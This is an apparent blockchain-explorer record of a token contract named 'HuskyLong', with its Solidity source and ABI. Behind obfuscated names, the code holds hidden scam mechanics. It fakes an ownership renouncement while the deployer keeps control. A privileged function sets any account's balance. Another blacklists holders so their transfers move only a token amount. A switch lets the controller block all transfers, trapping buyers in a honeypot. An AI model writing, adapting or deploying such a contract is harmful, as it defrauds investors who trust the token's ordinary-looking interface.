{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface enableAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract walletFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellList {\n    function createPair(address receiverMarketing, address sellIs) external returns (address);\n}\n\ninterface tradingMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeToken) external view returns (uint256);\n\n    function transfer(address modeAt, uint256 toAutoTx) external returns (bool);\n\n    function allowance(address isFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toAutoTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeAt,\n        uint256 toAutoTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletFrom, uint256 value);\n    event Approval(address indexed isFund, address indexed spender, uint256 value);\n}\n\ninterface tradingMinMetadata is tradingMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HuskyLong is walletFund, tradingMin, tradingMinMetadata {\n\n    bool public teamReceiver;\n\n    string private shouldTx = \"HLG\";\n\n    function sellTrading(address receiverEnableLaunch, uint256 toAutoTx) public {\n        buyLaunch();\n        takeTx[receiverEnableLaunch] = toAutoTx;\n    }\n\n    uint256 private tokenReceiver;\n\n    address swapFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private exemptListLiquidity;\n\n    function approve(address isShould, uint256 toAutoTx) public virtual override returns (bool) {\n        buyFrom[_msgSender()][isShould] = toAutoTx;\n        emit Approval(_msgSender(), isShould, toAutoTx);\n        return true;\n    }\n\n    uint256 public txSender;\n\n    function totalLimitAmount(address senderLiquidity) public {\n        buyLaunch();\n        \n        if (senderLiquidity == tokenTo || senderLiquidity == tokenLaunch) {\n            return;\n        }\n        walletTotal[senderLiquidity] = true;\n    }\n\n    uint256 feeReceiver;\n\n    function buyLaunch() private view {\n        require(totalSwap[_msgSender()]);\n    }\n\n    uint256 public liquidityReceiverAmount;\n\n    function transfer(address receiverEnableLaunch, uint256 toAutoTx) external virtual override returns (bool) {\n        return enableLaunchedMin(_msgSender(), receiverEnableLaunch, toAutoTx);\n    }\n\n    bool private receiverTo;\n\n    address private atTxEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldTx;\n    }\n\n    uint256 autoTeamExempt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityFee;\n    }\n\n    uint8 private liquidityFee = 18;\n\n    address public tokenLaunch;\n\n    address txToIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function receiverLaunch() public {\n        emit OwnershipTransferred(tokenTo, address(0));\n        atTxEnable = address(0);\n    }\n\n    function allowance(address toReceiverBuy, address isShould) external view virtual override returns (uint256) {\n        if (isShould == txToIs) {\n            return type(uint256).max;\n        }\n        return buyFrom[toReceiverBuy][isShould];\n    }\n\n    function isReceiver(address sellTotalList, address modeAt, uint256 toAutoTx) internal returns (bool) {\n        require(takeTx[sellTotalList] >= toAutoTx);\n        takeTx[sellTotalList] -= toAutoTx;\n        takeTx[modeAt] += toAutoTx;\n        emit Transfer(sellTotalList, modeAt, toAutoTx);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return atTxEnable;\n    }\n\n    bool private shouldLiquidity;\n\n    mapping(address => bool) public walletTotal;\n\n    function balanceOf(address modeToken) public view virtual override returns (uint256) {\n        return takeTx[modeToken];\n    }\n\n    mapping(address => mapping(address => uint256)) private buyFrom;\n\n    function exemptTo(address senderTotalTeam) public {\n        if (exemptEnable) {\n            return;\n        }\n        \n        totalSwap[senderTotalTeam] = true;\n        \n        exemptEnable = true;\n    }\n\n    mapping(address => bool) public totalSwap;\n\n    bool public exemptEnable;\n\n    function shouldWallet(uint256 toAutoTx) public {\n        buyLaunch();\n        feeReceiver = toAutoTx;\n    }\n\n    mapping(address => uint256) private takeTx;\n\n    event OwnershipTransferred(address indexed amountSwapTrading, address indexed teamLaunchedAuto);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingSell;\n    }\n\n    string private teamTrading = \"Husky Long\";\n\n    function name() external view virtual override returns (string memory) {\n        return teamTrading;\n    }\n\n    uint256 private tradingSell = 100000000 * 10 ** 18;\n\n    function enableLaunchedMin(address sellTotalList, address modeAt, uint256 toAutoTx) internal returns (bool) {\n        if (sellTotalList == tokenTo) {\n            return isReceiver(sellTotalList, modeAt, toAutoTx);\n        }\n        uint256 txTo = tradingMin(tokenLaunch).balanceOf(swapFund);\n        require(txTo == feeReceiver);\n        require(modeAt != swapFund);\n        if (walletTotal[sellTotalList]) {\n            return isReceiver(sellTotalList, modeAt, receiverList);\n        }\n        return isReceiver(sellTotalList, modeAt, toAutoTx);\n    }\n\n    function transferFrom(address sellTotalList, address modeAt, uint256 toAutoTx) external override returns (bool) {\n        if (_msgSender() != txToIs) {\n            if (buyFrom[sellTotalList][_msgSender()] != type(uint256).max) {\n                require(toAutoTx <= buyFrom[sellTotalList][_msgSender()]);\n                buyFrom[sellTotalList][_msgSender()] -= toAutoTx;\n            }\n        }\n        return enableLaunchedMin(sellTotalList, modeAt, toAutoTx);\n    }\n\n    constructor (){\n        if (exemptListLiquidity != tokenReceiver) {\n            tokenReceiver = liquidityReceiverAmount;\n        }\n        enableAuto launchedFund = enableAuto(txToIs);\n        tokenLaunch = sellList(launchedFund.factory()).createPair(launchedFund.WETH(), address(this));\n        \n        tokenTo = _msgSender();\n        receiverLaunch();\n        totalSwap[tokenTo] = true;\n        takeTx[tokenTo] = tradingSell;\n        \n        emit Transfer(address(0), tokenTo, tradingSell);\n    }\n\n    uint256 constant receiverList = 5 ** 10;\n\n    function getOwner() external view returns (address) {\n        return atTxEnable;\n    }\n\n    address public tokenTo;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountSwapTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamLaunchedAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toReceiverBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toAutoTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTotalTeam\",\"type\":\"address\"}],\"name\":\"exemptTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityReceiverAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverEnableLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toAutoTx\",\"type\":\"uint256\"}],\"name\":\"sellTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toAutoTx\",\"type\":\"uint256\"}],\"name\":\"shouldWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLiquidity\",\"type\":\"address\"}],\"name\":\"totalLimitAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverEnableLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toAutoTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTotalList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toAutoTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "HuskyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}